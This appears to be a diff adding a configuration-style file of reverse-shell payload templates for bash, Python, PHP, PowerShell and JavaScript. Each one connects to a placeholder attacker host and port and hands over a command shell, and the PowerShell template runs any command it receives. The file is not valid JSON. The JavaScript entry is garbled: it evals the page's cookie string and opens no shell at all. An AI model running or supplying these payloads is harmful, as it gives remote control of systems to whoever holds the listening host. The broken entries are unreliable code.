@@ -1,0 +1,35 @@
+{
+    "payloads": {
+        "bash_reverse": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "python_reverse": "import socket,os,pty;\n"
+                          "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n"
+                          "s.connect((\"{lhost}\",{lport}));\n"
+                          "os.dup2(s.fileno(),0);\n"
+                          "os.dup2(s.fileno(),1);\n"
+                          "os.dup2(s.fileno(),2);\n"
+                          "pty.spawn(\"/bin/sh\");",
+        "php_reverse": "$sock=fsockopen(\"{lhost}\",{lport});\n"
+                       "$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);",
+        "powershell_reverse": "$client = New-Object System.Net.Sockets.TCPClient;\n"
+                              "$client.Connect(\"{lhost}\",{lport});\n"
+                              "$stream = $client.GetStream();\n"
+                              "[byte[]]$bytes = 0..65535|%{{0}};\n"
+                              "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{\n"
+                              "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n"
+                              "$sendback = (iex $data 2>&1 | Out-String );\n"
+                              "$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";\n"
+                              "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n"
+                              "$stream.Write($sendbyte,0,$sendbyte.Length);\n"
+                              "$stream.Flush()}};\n"
+                              "$client.Close();",
+        "javascript_reverse": "var ws = new WebSocket('ws://{lhost}:{lport}');\n"
+                              "ws.onopen = function() {\n"
+                              "  var shell = function() {\n"
+                              "    var script = document.createElement('script');\n"
+                              "    script.src = 'data:text/javascript;base64,' + btoa('document.body.appendChild(document.createElement(\"iframe\")).contentWindow.eval(document.cookie)');\n"
+                              "    document.body.appendChild(script);\n"
+                              "  };\n"
+                              "  shell();\n"
+                              "};"
+    }
+}
